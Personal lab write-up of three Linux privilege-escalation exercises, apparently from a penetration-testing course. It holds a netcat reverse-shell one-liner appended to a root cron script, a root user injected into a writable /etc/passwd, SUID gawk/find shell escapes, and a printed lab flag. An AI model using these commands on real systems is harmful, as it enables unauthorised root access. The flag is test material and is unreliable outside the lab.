
# 18.3.5.2
On the target VM #1, use an appropriate privilege escalation technique to gain access to root and read the flag.Scheduling is all that matters.  
  
  
No cron jobs listed.  
  
Looked to see what services are running:
```bash
└─$ ps -aux  
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  
root           1  0.0  0.0   2416   576 ?        Ss   18:58   0:00 /bin/sh -c chmod 400 /root/flag.txt && chown root /root/flag.txt && /usr/sbin/sshd   && cron   && tail -f /var/log/cron.log
```

Tried finding the filename for that command... could only find name of the process:
```bash
└─$ ps -p 1 -o comm=  
	sh
```

Tried to find a .sh file which _could_ fit this purpose:
```bash
find / -user root -perm /222 -name *.sh 2>/dev/null  
/var/archives/archive.sh  
...  
  
└─$ cat /var/archives/archive.sh  
#!/bin/bash  
  
TIMESTAMP=$(date + "%T")  
echo "$TIMESTAMP running the archiver"  
#cp -rf /home/kali /var/backups/kali  
cp -rf /home/student/ /var/backups/student/
```

Looked extremely similar to the class mats, so figured why not.  
Added one-liner for a reverse shell:
```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f" >> /var/archives/archive.sh
```
	Which worked.  woot



# 18.3.5.3
On the target VM #2, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.  
  
So damn easy
```bash
┌──(student㉿982662cf759a)-[~]  
└─$ ls -lah /etc/passwd  
-rw-rw-rw- 1 root root 1.4K Jan  9 19:33 /etc/passwd  
┌──(student㉿982662cf759a)-[~]  
└─$ openssl passwd pwnd  
nRpOSeBTiWBf6  
┌──(student㉿982662cf759a)-[~]  
└─$ echo "root2:nRpOSeBTiWBf6:0:0:root:/root:/bin/bash" >> /etc/passwd  
┌──(student㉿982662cf759a)-[~]  
└─$ su root2  
Password:   
┌──(root💀982662cf759a)-[/home/student]
```



# 18.3.5.4
Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the target VM #3.Binary flags and custom shell are what to look for.  
  
Also so damn easy..... like, I literally laughed.  
  
  
Searched for binaries that had SUID or GUID bits set:
```bash
student@99df13b19ef1:~$ find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000  
/bin/umount  
/bin/su  
/bin/mount  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/gpasswd  
/usr/bin/find  
/usr/bin/chfn  
/usr/bin/gawk  
/usr/bin/vim.basic  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign  
find: unknown predicate `-o-'
```

Took a chance on gawk, though I think any one would've likely worked.  
  
Used [https://gtfobins.github.io/](https://gtfobins.github.io/) and searched for **gawk**. Used shell cmd vuln:
```bash
student@99df13b19ef1:~$ gawk 'BEGIN {system("/bin/sh")}'  
# id  
uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)  
# cat /root/flag.txt  
Great job! You found me.  
Here is your flag:  
  
OS{e63003c582419ac5916f6def043fb033}
```
	*Notice the EUID

(Also works for [**awk**](Cmdline%20Tools.md#awk))

[**find**](Cmdline%20Tools.md#find) also works:
```bash
find . -exec /bin/sh \; -quit
```